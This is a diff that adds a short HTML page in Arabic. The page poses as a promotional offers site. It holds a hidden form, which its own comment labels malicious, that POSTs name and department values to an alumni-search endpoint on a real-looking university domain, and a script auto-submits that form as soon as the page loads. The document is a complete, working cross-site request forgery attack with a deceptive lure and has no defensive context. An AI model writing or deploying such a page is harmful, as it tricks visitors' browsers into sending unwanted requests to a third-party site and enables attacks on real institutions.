@@ -1,0 +1,36 @@
+<html>
+
+    <body>
+
+        <h1>مرحبًا! تفضل بزيارة موقعنا المميز!</h1>
+
+        <p>من فضلك، اضغط على الرابط أدناه لتجد أفضل العروض لدينا!</p>
+
+
+
+        <!-- النموذج الخبيث الذي يرسل طلباً إلى الموقع المستهدف -->
+
+        <form action="https://cit.edu.ly/viewalumni.php" method="POST" style="display:none;">
+
+            <input type="text" name="name" value="حسن عبدالله">
+
+            <input type="text" name="department" value="هندسة الكمبيوتر">
+
+            <button type="submit">بحث</button>
+
+        </form>
+
+
+
+        <!-- الجافا سكربت الذي يرسل النموذج تلقائيًا -->
+
+        <script>
+
+            document.forms[0].submit();
+
+        </script>
+
+    </body>
+
+</html>
+
